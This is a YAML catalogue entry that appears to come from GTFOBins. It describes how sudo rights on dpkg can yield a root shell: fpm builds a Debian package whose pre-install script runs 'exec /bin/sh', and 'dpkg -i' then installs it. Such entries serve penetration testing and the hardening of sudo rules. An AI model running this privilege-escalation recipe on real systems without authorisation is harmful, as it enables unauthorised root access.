id: gtfobins/dpkg/shell/sudo
type: binary
platform: linux
name: dpkg
phases:
- execution
- privilege-escalation
capabilities:
- shell
privilege_required: sudo
sources:
- project: GTFOBins
  upstream_url: https://gtfobins.github.io
  license: GPL-3.0
  upstream_version: acd5246
  last_synced: '2026-08-25'
commands:
- template: dpkg -i x_1.0_all.deb
  comment: 'Generate the Debian package with [fpm](https://github.com/jordansissel/fpm) and upload it
    to the target.


    ```

    echo ''exec /bin/sh'' >x.sh

    fpm -n x -s dir -t deb -a all --before-install x.sh .

    ```'
references:
- https://gtfobins.github.io/gtfobins/dpkg/
tags:
- linux
- unix
- gtfobins
